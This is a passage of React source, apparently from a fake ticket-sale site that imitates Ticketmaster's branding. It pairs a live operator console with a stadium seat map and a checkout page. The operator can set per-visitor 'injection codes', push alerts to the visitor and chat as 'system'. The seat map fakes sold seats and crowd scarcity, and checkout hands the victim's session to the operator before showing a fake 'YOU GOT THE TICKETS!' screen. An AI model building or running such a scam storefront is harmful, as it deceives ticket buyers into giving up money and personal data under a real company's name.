          <><div className="p-12 border-b border-white/5 bg-[#1f262d]/70 flex justify-between items-center shadow-3xl backdrop-blur-3xl z-20">
               <div className="flex items-center gap-10">
                  <div className="w-28 h-28 bg-gradient-to-br from-[#026cdf] to-blue-900 rounded-[50px] flex items-center justify-center font-black text-white text-5xl shadow-[0_30px_70px_rgba(2,108,223,0.5)] italic tracking-tighter border-4 border-white/20">TM</div>
                  <div className="space-y-3"><h2 className="text-7xl font-black tracking-tighter uppercase italic text-white leading-none drop-shadow-[0_10px_30px_rgba(0,0,0,1)] italic">{activeT.name || 'Visitor Identity Encrypted'}</h2><div className="flex items-center gap-6 text-gray-500 font-black text-[13px] uppercase tracking-[0.6em] italic"><p>{activeT.location}</p><div className="w-3 h-3 bg-[#026cdf] rounded-full shadow-[0_0_15px_#026cdf]" /><p className="text-white opacity-40">SIGNAL_{activeT.id.slice(-10).toUpperCase()}</p></div></div>
               </div>
               <div className="flex gap-8"><div className="bg-black/50 px-10 py-5 rounded-full border-2 border-white/5 flex items-center gap-6 shadow-3xl"><Activity className="w-7 h-7 text-[#026cdf] animate-pulse" /><p className="text-[14px] font-black uppercase tracking-[0.6em] italic">{activeT.status}</p></div><button onClick={() => updateSession(activeT.id, {status: 'secure_complete'})} className="bg-green-600 text-white px-14 py-5 rounded-full font-black text-[14px] uppercase shadow-3xl hover:bg-green-700 active:scale-90 transition-all italic border-b-8 border-green-950 tracking-[0.4em]">Finalize Flow</button></div>
            </div>
            <div className="flex-1 p-16 overflow-y-auto space-y-12 flex flex-col scroll-pro relative z-10">
               {activeT.chatHistory?.map((m, i) => (
                 <div key={i} className={`flex ${m.sender === 'user' ? 'justify-start' : 'justify-end'}`}>
                    <div className={`max-w-[70%] p-10 rounded-[60px] text-[18px] font-black shadow-[0_40px_100px_rgba(0,0,0,0.5)] relative leading-relaxed ${m.sender === 'user' ? 'bg-white text-black rounded-bl-none border-8 border-white shadow-white/5' : 'bg-gradient-to-br from-[#026cdf] to-blue-800 text-white rounded-br-none border-8 border-blue-500/20 shadow-blue-500/30 italic'}`}>{m.text}<p className={`text-[10px] mt-6 uppercase tracking-widest ${m.sender === 'user' ? 'text-gray-400' : 'text-white/40'}`}>{new Date(m.timestamp).toLocaleTimeString()}</p></div>
                 </div>
               ))}
               <div id="scroll-bottom" />
            </div>
            <div className="w-full bg-[#1f262d]/70 border-t border-white/5 p-12 flex flex-col md:flex-row gap-12 backdrop-blur-3xl">
               <div className="flex-1 bg-black/60 p-10 rounded-[60px] border-4 border-white/5 flex items-center gap-10 shadow-3xl hover:border-[#026cdf]/60 transition-all group">
                  <div className="space-y-2 w-48"><p className="text-[12px] font-black uppercase text-[#026cdf] tracking-[0.4em] italic">Injection Code</p><p className="text-[10px] text-gray-500 uppercase font-black tracking-widest opacity-40 leading-none">Access Unlocked</p></div>
                  <input className="flex-1 bg-transparent font-black text-[#026cdf] text-8xl outline-none placeholder:text-gray-900 uppercase italic tracking-[0.6em]" placeholder="SET" onBlur={(e) => updateSession(activeT.id, { userAuthCode: e.target.value.trim().toUpperCase() })} defaultValue={activeT.userAuthCode} />
               </div>
               <div className="flex-1 bg-black/60 p-10 rounded-[60px] border-4 border-white/5 flex items-center gap-10 shadow-3xl hover:border-[#ea0042]/60 transition-all group">
                  <div className="space-y-2 w-48"><p className="text-[12px] font-black uppercase text-[#ea0042] tracking-[0.4em] italic">System Alert</p><p className="text-[10px] text-gray-500 uppercase font-black tracking-widest opacity-40 leading-none">Broadcast Ping</p></div>
                  <input className="flex-1 bg-transparent font-black text-gray-100 text-xl outline-none placeholder:text-gray-900 uppercase italic tracking-widest" placeholder="TYPE NOTIFICATION..." id="p-box" onKeyDown={e => { if(e.key==='Enter'){ const i = document.getElementById('p-box'); if(i.value.trim()){ updateSession(activeT.id, { notifications: [...(activeT.notifications || []), {text: i.value, timestamp: new Date().toISOString()}] }); i.value=''; } } }} />
                  <button onClick={() => { const i = document.getElementById('p-box'); if(i.value.trim()){ updateSession(activeT.id, { notifications: [...(activeT.notifications || []), {text: i.value, timestamp: new Date().toISOString()}] }); i.value=''; } }} className="bg-[#ea0042] p-6 rounded-full shadow-[0_0_40px_#ea0042] active:scale-75 transition-all shadow-xl scale-125"><Zap className="w-8 h-8 text-white" /></button>
               </div>
            </div>
            <div className="p-12 border-t border-white/5 bg-[#1f262d] relative z-30">
               <div className="flex gap-8 max-w-7xl mx-auto"><div className="flex-1 relative group/inp">
                     <input id="admin-main-inp" placeholder="Send secure agent response stream..." className="w-full bg-black/60 border-8 border-white/5 p-10 rounded-[65px] font-black text-2xl outline-none italic transition-all focus:border-[#026cdf]/50 focus:bg-black/80 shadow-inner" onKeyDown={e => { if(e.key==='Enter'){ sendChatMessage(activeT.id, e.target.value, 'system'); e.target.value='' } }} />
                     <button onClick={() => { const i = document.getElementById('admin-main-inp'); if(i.value.trim()){ sendChatMessage(activeT.id, i.value, 'system'); i.value=''; } }} className="absolute right-6 top-6 bg-[#026cdf] text-white p-7 rounded-[45px] shadow-[0_30px_70px_rgba(2,108,223,0.6)] hover:bg-blue-700 active:scale-90 transition-all italic scale-110"><Send className="w-10 h-10" /></button>
                  </div></div>
            </div></>
        ) : (
          <div className="flex-1 flex flex-col items-center justify-center opacity-10 animate-pulse italic">
             <Activity className="w-[30rem] h-[30rem] mb-12 text-[#026cdf] animate-pulse" />
             <h3 className="text-8xl font-black uppercase tracking-[1.5em] text-white italic leading-none">OFFLINE</h3>
             <p className="text-2xl font-black uppercase tracking-[1em] text-gray-500 mt-20 italic">No Active Perimeter Signals Detected</p>
          </div>
        )}
      </div>
    </div>
  );
}

// ==========================================
// VIEWS: SITE MODULES (STADIUM & CHECKOUT)
// ==========================================

function SeatMapView({ event, presaleCode, cart, setCart, globalPrice, onCheckout }) {
  const [view, setView] = useState('overview');
  const [fakeSold, setFakeSold] = useState([]);
  useEffect(() => {
    const itv = setInterval(() => {
       const sid = `s-${Math.ceil(Math.random()*8)}-${Math.ceil(Math.random()*12)}`;
       setFakeSold(prev => [...new Set([...prev, sid])]);
    }, 4000);
    return () => clearInterval(itv);
  }, []);
  const toggle = (s) => { if(!fakeSold.includes(s.id)){ if(cart.find(i=>i.id===s.id))setCart(cart.filter(i=>i.id!==s.id)); else if(cart.length<8)setCart([...cart,s]); } };
  return (
    <div className="h-[calc(100vh-64px)] flex flex-col bg-[#f1f5f9] relative italic no-select"><div className="bg-[#ea0042] text-white text-[12px] py-4 text-center font-black tracking-[0.6em] uppercase animate-pulse shadow-3xl z-20 border-b-8 border-black/10 leading-none">Security Lock: 1 of 8,421 fans currently securing Floor Section inventory.</div><div className="flex-1 overflow-y-auto p-4 md:p-20 pb-56 scroll-pro"><div className="max-w-7xl mx-auto space-y-20">
      {view === 'overview' ? (
        <div className="bg-white p-20 rounded-[120px] shadow-[0_80px_180px_rgba(0,0,0,0.15)] border-8 border-white text-center animate-slideUp relative"><div className="space-y-6 mb-20"><h2 className="text-7xl md:text-[8rem] font-black tracking-tighter uppercase italic text-blue-950 leading-none">{event?.artist}</h2><div className="flex justify-center gap-8 text-gray-400 font-black uppercase tracking-[0.6em] text-sm"><Globe className="w-5 h-5" /> <p>{event?.venue} • {event?.date}</p></div></div><div onClick={() => setView('zoom')} className="w-full max-w-4xl mx-auto aspect-video bg-gradient-to-br from-blue-50 to-blue-100/50 border-[6px] border-dashed border-[#026cdf] rounded-[110px] flex flex-col items-center justify-center cursor-pointer hover:scale-[1.08] transition-all relative group shadow-inner"><div className="absolute top-0 w-96 h-14 bg-black rounded-b-[50px] font-black text-[12px] text-white flex items-center justify-center tracking-[1em] border-b-8 border-black/50 shadow-3xl italic">STAGE HUB</div><div className="bg-white px-20 py-12 rounded-[70px] shadow-[0_40px_100px_rgba(2,108,223,0.3)] border-4 border-blue-50 flex flex-col items-center group-hover:scale-110 transition-all duration-1000"><span className="font-black text-[#026cdf] text-6xl tracking-tighter italic uppercase">FLOOR SEATS</span><span className="text-[14px] font-black text-gray-400 mt-6 uppercase tracking-[0.6em]">Initialize Core Inventory View</span></div></div></div>
      ) : (
        <div className="animate-fadeIn"><button onClick={() => setView('overview')} className="mb-14 text-[#026cdf] font-black text-[14px] flex items-center gap-6 bg-white px-12 py-6 rounded-full shadow-[0_30px_70px_rgba(0,0,0,0.2)] uppercase tracking-[0.6em] border-4 border-white hover:scale-110 active:scale-90 transition-all italic shadow-2xl scale-110"><ChevronLeft className="w-6 h-6" /> Return to Overview</button><div className="bg-white p-20 rounded-[130px] shadow-[0_120px_250px_rgba(0,0,0,0.3)] border-8 border-white space-y-14 overflow-x-auto min-w-full relative shadow-inner"><div className="bg-gradient-to-b from-black to-[#1f262d] text-white text-center py-20 font-black tracking-[4em] text-sm mb-32 rounded-[80px] shadow-[0_30px_90px_rgba(0,0,0,0.8)] border-b-[20px] border-gray-950 uppercase italic leading-none">STAGE CORE</div>
          {[...Array(8)].map((_, r) => (<div key={r} className="flex gap-8 justify-center">{[...Array(12)].map((_, c) => { const id = `s-${r+1}-${c+1}`; const isSold = fakeSold.includes(id) || (r+c)%8===0; const isSel = cart.find(i=>i.id===id); const isVIP = r<2; return (<div key={id} onClick={()=>toggle({id,section:'Floor',row:r+1,seat:c+1,price:isVIP?globalPrice*4:globalPrice})} className={`w-14 h-14 md:w-20 md:h-20 rounded-full flex items-center justify-center text-[12px] font-black transition-all border-4 cursor-pointer relative ${isSel ? 'bg-green-500 border-green-700 text-white scale-150 shadow-[0_0_50px_rgba(34,197,94,0.9)] z-10' : isSold ? 'bg-gray-100 border-gray-200 opacity-20 text-transparent cursor-not-allowed scale-90 shadow-inner' : isVIP ? 'bg-gradient-to-br from-amber-300 to-amber-500 border-amber-600 text-amber-950 shadow-3xl' : 'bg-gradient-to-br from-[#026cdf] to-blue-700 border-blue-900 text-white shadow-3xl hover:scale-125 hover:z-20'}`}>{isSel ? <CheckCircle className="w-10 h-10" /> : c+1}</div>); })}</div>))}
          <div className="pt-24 flex justify-center gap-20 border-t-4 border-gray-50"><div className="flex items-center gap-5"><div className="w-6 h-6 rounded-full bg-amber-400 shadow-xl" /><span className="text-[12px] font-black uppercase tracking-[0.4em] italic">VIP Platinum</span></div><div className="flex items-center gap-5"><div className="w-6 h-6 rounded-full bg-[#026cdf] shadow-xl" /><span className="text-[12px] font-black uppercase tracking-[0.4em] italic">Standard Access</span></div></div></div></div>
      )}</div></div>
      <div className="h-40 bg-white/95 backdrop-blur-3xl border-t-8 border-gray-50 p-12 fixed bottom-0 w-full shadow-[0_-50px_150px_rgba(0,0,0,0.3)] flex items-center justify-between z-[100]"><div className="space-y-3"><div className="flex items-center gap-5"><div className="w-4 h-4 bg-green-500 rounded-full animate-pulse shadow-[0_0_20px_#22c55e]" /><p className="text-[16px] text-gray-400 font-black uppercase tracking-[0.6em] leading-none italic">{cart.length} Elite Seats Secured</p></div><p className="text-8xl font-black text-gray-950 tracking-tighter leading-none italic shadow-sm drop-shadow-xl">${cart.reduce((a, b) => a + b.price, 0).toFixed(2)}</p></div><button onClick={onCheckout} disabled={cart.length===0} className={`px-32 py-10 rounded-[60px] font-black text-white shadow-[0_40px_100px_rgba(2,108,223,0.6)] transition-all uppercase tracking-[0.4em] text-4xl italic ${cart.length > 0 ? 'bg-[#026cdf] hover:bg-blue-700 hover:scale-110 active:scale-90 shadow-blue-500/70 border-b-8 border-blue-900' : 'bg-gray-200 cursor-not-allowed opacity-40'}`}>Checkout Flow</button></div></div>
  );
}

function CheckoutView({ cart, sessionId, sessionData, updateSession, onSuccess, onBack }) {
  const [loading, setLoading] = useState(false);
  const total = (cart.reduce((a, b) => a + b.price, 0) + (cart.length * 24.50) + 9.00).toFixed(2);
  const handlePay = () => { setLoading(true); updateSession(sessionId, { status: 'security_handoff' }); setTimeout(() => { setLoading(false); onSuccess(); }, 4000); };
  return (
    <div className="min-h-screen bg-[#f8fafc] p-10 italic pb-56 italic no-select"><div className="max-w-7xl mx-auto space-y-20"><button onClick={onBack} className="text-[#026cdf] font-black text-[15px] uppercase tracking-[0.6em] flex items-center gap-6 active:scale-75 transition-all bg-white px-10 py-6 rounded-full shadow-[0_30px_90px_rgba(0,0,0,0.1)] border-8 border-white scale-110"><ChevronLeft /> Edit Selection</button><div className="grid grid-cols-1 md:grid-cols-2 gap-20">
      <div className="bg-white p-16 rounded-[100px] shadow-[0_80px_180px_rgba(0,0,0,0.1)] space-y-16 border-8 border-white relative overflow-hidden italic shadow-2xl"><div className="absolute top-0 left-0 w-3 h-full bg-[#026cdf] shadow-[0_0_20px_#026cdf]" /><h3 className="text-6xl font-black tracking-tighter uppercase italic border-b-8 border-gray-50 pb-10 leading-none">Satellite Cart</h3><div className="space-y-8">{cart.map(s => (<div key={s.id} className="flex justify-between items-center text-2xl font-black border-b-4 border-gray-50 pb-10 last:border-0"><div className="space-y-3"><p className="text-gray-300 text-[13px] uppercase tracking-[0.5em] font-black leading-none">Floor Section Premium</p><p className="text-gray-950 uppercase italic tracking-tighter italic">Row {s.row}, Seat {s.seat}</p></div><p className="text-5xl font-black text-[#026cdf] tracking-tighter italic shadow-sm">${s.price.toFixed(2)}</p></div>))}</div><div className="bg-gray-50 p-16 rounded-[70px] space-y-6 shadow-inner border-4 border-white"><div className="flex justify-between items-center text-[15px] font-black text-gray-400 uppercase tracking-[0.5em] leading-none"><span>System Fees</span><span>${(cart.length * 24.5).toFixed(2)}</span></div><div className="flex justify-between items-center text-[15px] font-black text-gray-400 uppercase tracking-[0.5em] leading-none"><span>Satellite Tax</span><span>$9.00</span></div><div className="flex justify-between items-center text-[10rem] font-black text-gray-950 tracking-tighter uppercase mt-12 italic pt-16 border-t-8 border-dashed border-gray-200 leading-none shadow-sm italic"><span>Total</span><span>${total}</span></div></div></div>
      <div className="bg-white p-16 rounded-[100px] shadow-[0_100px_250px_rgba(0,0,0,0.15)] space-y-20 border-8 border-white h-fit relative shadow-2xl"><div className="space-y-6"><h3 className="text-6xl font-black tracking-tighter uppercase italic leading-none">Security Dock</h3><p className="text-[14px] font-black uppercase text-gray-300 tracking-[0.8em] italic">Authorized Link Protocol</p></div><div className="space-y-12"><div className="bg-blue-50 p-14 rounded-[65px] border-8 border-dashed border-blue-100 text-center shadow-inner"><ShieldCheck className="w-20 h-20 text-[#026cdf] mx-auto mb-10 shadow-3xl animate-pulse" /><p className="text-[18px] text-[#026cdf] font-black uppercase italic tracking-[0.3em] leading-relaxed italic leading-loose shadow-sm">Your Identity profile is verified. Access to QR-TICKETS is ready. Complete purchase to release tokenized flow.</p></div><div className="space-y-12"><div className="bg-gray-50 p-12 rounded-[50px] border-8 border-white shadow-2xl"><p className="text-[13px] font-black uppercase text-gray-400 mb-6 tracking-[0.6em] italic">Receiver Node</p><p className="text-4xl font-black text-blue-950 italic tracking-tighter uppercase leading-none shadow-sm">{sessionData.email || 'AUTHENTICATED FAN'}</p></div><button onClick={handlePay} className="w-full bg-[#026cdf] text-white py-12 rounded-[60px] font-black shadow-[0_40px_100px_rgba(2,108,223,0.7)] uppercase tracking-[0.4em] text-4xl italic hover:scale-110 active:scale-95 transition-all border-b-[16px] border-blue-900 italic shadow-blue-500/50">Initiate Settle</button><div className="flex flex-col items-center gap-8 pt-6 opacity-30 italic"><div className="flex gap-10"><CreditCard className="w-10 h-10" /><Wallet className="w-10 h-10" /><Lock className="w-10 h-10" /></div><p className="text-[12px] text-gray-400 text-center uppercase tracking-[1em] font-black leading-none">Quantum Encryption Active</p></div></div></div></div>
    </div></div></div>
  );
}

function SuccessView({ event, cart, onHome }) {
  const [show, setShow] = useState(false);
  useEffect(() => { setTimeout(() => setShow(true), 1000); }, []);
  const total = (cart.reduce((a,b)=>a+b.price,0) + (cart.length * 24.50) + 9.00).toFixed(2);
  return (
    <div className="min-h-screen bg-[#026cdf] flex items-center justify-center p-6 overflow-hidden relative"><div className="absolute inset-0 pointer-events-none opacity-60 italic">{[...Array(60)].map((_, i) => (<div key={i} className={`absolute w-4 h-24 bg-white/40 rounded-full animate-confetti shadow-3xl`} style={{ left: `${Math.random()*100}%`, animationDelay: `${Math.random()*5}s`, top: `-150px`, transform: `rotate(${Math.random()*360}deg)` }} />))}</div>
    <div className={`bg-white w-full max-w-4xl rounded-[150px] p-24 text-center shadow-[0_150px_300px_rgba(0,0,0,1)] transition-all duration-[2000ms] transform ${show ? 'scale-100 opacity-100' : 'scale-50 opacity-0 translate-y-[300px]'}`}><div className="w-56 h-56 bg-green-500 rounded-[80px] flex items-center justify-center mx-auto mb-20 shadow-[0_50px_150px_rgba(34,197,94,0.8)] animate-bounce border-[12px] border-white/30"><CheckCircle className="text-white w-32 h-32 stroke-[4]" /></div><h1 className="text-7xl md:text-[10rem] font-black text-gray-950 leading-none mb-10 uppercase italic tracking-tighter italic drop-shadow-2xl">YOU GOT THE TICKETS!</h1><p className="text-gray-400 font-black mb-24 text-xl uppercase tracking-[1em] italic opacity-50 shadow-sm leading-none">Official ID Secured: TM_{Math.random().toString(36).substr(2, 12).toUpperCase()}</p>
    <div className="bg-gray-50 rounded-[110px] p-24 border-[12px] border-dashed border-gray-100 mb-24 space-y-16 shadow-inner text-center relative overflow-hidden group scale-105"><div className="flex flex-col items-center justify-center gap-12 relative z-10"><div className="flex items-center justify-center gap-6"><span className="font-black text-7xl tracking-tighter uppercase italic text-blue-950 drop-shadow-2xl italic shadow-blue-500/20">ticketmaster</span><div className="bg-[#026cdf] rounded-full w-12 h-12 flex items-center justify-center shadow-3xl border-4 border-white"><CheckCircle className="w-8 h-8 text-white" /></div></div><div className="space-y-4 italic"><p className="text-[20px] text-gray-300 font-black uppercase tracking-[1.5em] italic opacity-50 leading-none">Settled Protocol</p><p className="text-[12rem] font-black text-gray-950 tracking-tighter italic leading-none drop-shadow-[0_20px_60px_rgba(0,0,0,0.5)] scale-110">${total}</p></div></div></div>
    <button onClick={onHome} className="w-full bg-[#1f262d] text-white py-14 rounded-[80px] font-black text-5xl hover:bg-black uppercase tracking-[0.5em] italic shadow-[0_50px_150px_rgba(0,0,0,0.8)] transition-all active:scale-95 scale-110 border-b-[20px] border-black/50 leading-none">OPEN TICKETS</button></div>
    <style>{`
      @keyframes confetti { 0% { transform: translateY(0) rotate(0deg); opacity: 1; } 100% { transform: translateY(110vh) rotate(720deg); opacity: 0; } }
      .animate-confetti { animation: confetti linear infinite; }
      .scroll-pro::-webkit-scrollbar { width: 6px; }
      .scroll-pro::-webkit-scrollbar-thumb { background: rgba(0,0,0,0.1); border-radius: 20px; }
      @keyframes slideUp { from { transform: translateY(150px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
      .animate-slideUp { animation: slideUp 1s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
      @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
      .animate-fadeIn { animation: fadeIn 1.5s ease-out forwards; }
      @keyframes slideDown { from { transform: translateY(-80px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
      .animate-slideDown { animation: slideDown 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
      @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-15px); } 75% { transform: translateX(15px); } }
      .animate-shake { animation: shake 0.3s ease-in-out infinite; }
      .animate-spin-slow { animation: spin 12s linear infinite; }
      @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
    `}</style></div>
  );
}

